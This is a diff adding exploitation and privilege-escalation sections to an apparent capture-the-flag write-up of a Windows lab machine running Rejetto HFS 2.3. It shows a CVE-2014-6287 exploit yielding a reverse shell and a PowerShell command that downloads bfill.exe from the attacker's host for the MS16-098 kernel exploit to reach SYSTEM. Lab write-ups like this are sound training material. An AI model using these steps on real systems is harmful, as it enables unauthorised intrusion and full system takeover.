@@ -56,13 +56,94 @@ UDP scan returned no actionable results.
 
 Browsing the root page showed the default HFS interface with no authentication required. A Gobuster scan did not identify useful directories.
 
+---
+
+## 5. Exploitation
+
 ### Vulnerability Identification
 
 Research in to HFS 2.3 revealed multiple public exploits. After testing newer SSTI-based exploits unsuccessfully, a reliable RCE PoC was located for **CVE-2014-6287** (Rejetto HFS 2.3 RCE).
 
+### Execution
+
+The **CVE-2014-6287 Rejetto HFS 2.3 RCE exploit** was edited to include local host and listening port.
+
+Running the exploit:
+
+```
+python3 exploit.py 10.129.13.67 80
+```
+
+A reverse shell was received as `OPTIMUM\kostas`.
+
 ---
 
+## 6. Privilege Escalation
 
+### System Enumeration
+
+Systeminfo revealed:
+
+- **OS:** Windows Server 2012 R2 Standard
+- **Build:** 6.3.9600
+- **Architecture:** x64
+- **Hotfix count:** 31 installed
+- **User:** kostas
+
+Initial checks (privileges, services, file searches) did not reveal misconfigurations.
+
+### Kernel Vulnerability Analysis
+
+Tools such as *Windows-Exploit-Suggester* returned not valid results due to database mismatch issues.
+
+Manual OS-version analysis identified the host as potentially vulnerable to **MS16-098**, a well-known Windows 8.1 / Server 2012 R2 kernel logical flaw (TrackPopupMenuEx vulnerability).
+
+### Exploit Deployment
+
+The MS16-098 exploit by SensePost was cloned:
+
+```
+git clone https://github.com/sensepost/ms16-098
+```
+
+The exploit required uploading **bfill.exe** to the target. This was done using PowerShell:
+
+```
+PowerShell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.7:80/bfill.exe','C:\Users\Public\Downloads\bfill.exe')"
+```
+
+Execution:
+
+```
+C:\Users\Public\Downloads\bfill.exe
+```
+
+Resulting in elevation to `NT AUTHORITY\SYSTEM`.
+
+---
+
+## 7. Post-Exploitation
+
+**User Flag**: *REDACTED*
+
+```
+type C:\Users\kostas\Desktop\user.txt
+```
+
+**Root Flag**: *REDACTED*
+
+```
+type C:\Users\Administrator\Desktop\root.txt
+```
+
+---
+
+## 8. Key Vulnerabilities Identified
+
+| Vulnerability | Severity | Description | Impact |
+|---------------|----------|-------------|--------|
+| Rejetto HTTP File Server 2.3 RCE | Critical | An insecure function in Rejetto HTTP File Server allows remote attackers to execute arbitrary programs | Remote Code Execution |
+| MS16-098 Windows Kernel Exploit | High | Kernel mode driver GDI object abuse enabling privilege escalation. | Root Access |
 
 ---
 
